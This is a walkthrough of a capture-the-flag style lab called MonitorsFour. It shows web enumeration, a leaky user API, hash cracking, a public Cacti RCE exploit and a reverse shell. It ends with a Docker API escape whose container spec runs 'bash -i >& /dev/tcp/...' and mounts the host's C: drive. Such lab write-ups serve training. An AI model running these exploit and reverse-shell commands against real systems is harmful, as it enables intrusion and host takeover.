@@ -1,0 +1,211 @@
+## Lab Details
+- Difficulty: Easy
+- OS: Windows
+
+## Summary
+- Initial access: Vulnerability in Cacti 
+- Privilege escalation: Docker LPE
+ 
+## Enumeration
+#### Steps
+- run `nmap`
+```
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx
+|_http-title: Did not follow redirect to http://monitorsfour.htb/
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+## Foothold
+
+#### Steps
+- Visit target on port 80, points to domain `monitorsfour.htb` add to `/etc/hosts`
+- Enumerate the endpoints 
+```
+$ ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -ic
+
+<SNIP>
+
+login                   [Status: 200, Size: 4340, Words: 1342, Lines: 96, Duration: 41ms]
+                        [Status: 200, Size: 13688, Words: 3598, Lines: 339, Duration: 78ms]
+contact                 [Status: 200, Size: 367, Words: 34, Lines: 5, Duration: 92ms]
+user                    [Status: 200, Size: 35, Words: 3, Lines: 1, Duration: 78ms]
+```
+- Enumerate the subdomain 
+```
+$ ffuf -u "http://10.129.170.191" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.monitorsfour.htb" -fs 138
+
+<SNIP>
+
+cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 26ms]
+
+```
+- At the user endpoint we can obtain a list of users by supplying a token with value 0
+```
+$ curl http://monitorsfour.htb/user?token=0 | jq .
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1113    0  1113    0     0  57380      0 --:--:-- --:--:-- --:--:-- 58578
+[
+  {
+    "id": 2,
+    "username": "admin",
+    "email": "admin@monitorsfour.htb",
+    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
+    "role": "super user",
+    "token": "8024b78f83f102da4f",
+    "name": "Marcus Higgins",
+    "position": "System Administrator",
+    "dob": "1978-04-26",
+    "start_date": "2021-01-12",
+    "salary": "320800.00"
+  },
+  {
+    "id": 5,
+    "username": "mwatson",
+    "email": "mwatson@monitorsfour.htb",
+    "password": "69196959c16b26ef00b77d82cf6eb169",
+    "role": "user",
+    "token": "0e543210987654321",
+    "name": "Michael Watson",
+    "position": "Website Administrator",
+    "dob": "1985-02-15",
+    "start_date": "2021-05-11",
+    "salary": "75000.00"
+  },
+  {
+    "id": 6,
+    "username": "janderson",
+    "email": "janderson@monitorsfour.htb",
+    "password": "2a22dcf99190c322d974c8df5ba3256b",
+    "role": "user",
+    "token": "0e999999999999999",
+    "name": "Jennifer Anderson",
+    "position": "Network Engineer",
+    "dob": "1990-07-16",
+    "start_date": "2021-06-20",
+    "salary": "68000.00"
+  },
+  {
+    "id": 7,
+    "username": "dthompson",
+    "email": "dthompson@monitorsfour.htb",
+    "password": "8d4a7e7fd08555133e056d9aacb1e519",
+    "role": "user",
+    "token": "0e111111111111111",
+    "name": "David Thompson",
+    "position": "Database Manager",
+    "dob": "1982-11-23",
+    "start_date": "2022-09-15",
+    "salary": "83000.00"
+  }
+]
+```
+- Decrypt the hash and found the plaintext for admin user 
+```
+$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt 
+<SNIP>
+56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1               
+```
+- User admin to login 
+```
+admin : wonderful1
+```
+- Hit dead end 
+![[Pasted image 20260603080212.png]]
+- Attempt to login to the `cacti.monitorsfour.htb` does not work with the `admin:wonderful1`
+- Attempt to spray with other usernames and found the login as `marcus`
+```
+marcus : wonderful1
+```
+- Identified the version of cacti is `1.2.28`
+- Search online and found RCE for cacti version < 1.2.28 https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/tree/main
+```
+$ python3 exploit.py -u marcus -p wonderful1 -i 10.10.14.17 -l 4444 -url http://cacti.monitorsfour.htb
+[+] Cacti Instance Found!
+[+] Serving HTTP on port 80
+[+] Login Successful!
+[+] Got graph ID: 226
+[i] Created PHP filename: PPjw6.php
+[+] Got payload: /bash
+[i] Created PHP filename: Zpkyp.php
+[+] Hit timeout, looks good for shell, check your listener!
+[+] Stopped HTTP server on port 80
+```
+- Obtain a reverse shell
+```
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.129.170.191] 54095
+bash: cannot set terminal process group (9): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@821fbd6a43fa:~/html/cacti$ whoami
+whoami
+www-data
+```
+
+
+## Lateral Movement 
+
+#### Steps
+
+## Privilege Escalation
+
+#### Steps
+- Load and run `linpeas.sh`
+- Identified the shell environment is running in a docker 
+```
+╔══════════╣ Container details (T1613,T1611)
+═╣ Is this a container? ........... docker
+═╣ Docker marker .................. /.dockerenv
+```
+- Enumerate the host ip
+```
+$ cat /etc/resolv.conf
+
+# Generated by Docker Engine.
+# This file can be edited; Docker Engine will not make further changes once it
+# has been modified.
+
+nameserver 127.0.0.11
+options ndots:0
+
+# Based on host file: '/etc/resolv.conf' (internal resolver)
+# ExtServers: [host(192.168.65.7)]
+# Overrides: []
+# Option ndots from: internal
+```
+- Attempt to enumerate the docker API endpoint on the host 
+```
+$ curl http://192.168.65.7:2375/version
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   852    0   852    0     0  22454      0 --:--:-- --:--:-- --:--:-- 23027
+{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
+```
+- We get a response back and its not protected
+- Create a malicious docker image with reverse shell commands
+- We are binding the `C:\` of the host to `/host_root` in format `/mnt/host/c` and since the Linux VM that we are interacting with is running in WSL `/mnt/host/c` works
+```
+{
+  "Image": "docker_setup-nginx-php:latest",
+  "Cmd": [
+    "/bin/bash",
+    "-c",
+    "bash -i >& /dev/tcp/10.10.14.17/9999 0>&1"
+  ],
+  "HostConfig": {
+    "Binds": [
+      "/mnt/host/c:/host_root"
+    ]
+  }
+}
+```
+## Lessons Learned
+- Attack family:
+- Key takeaway:
+
+## Resources
+- References:
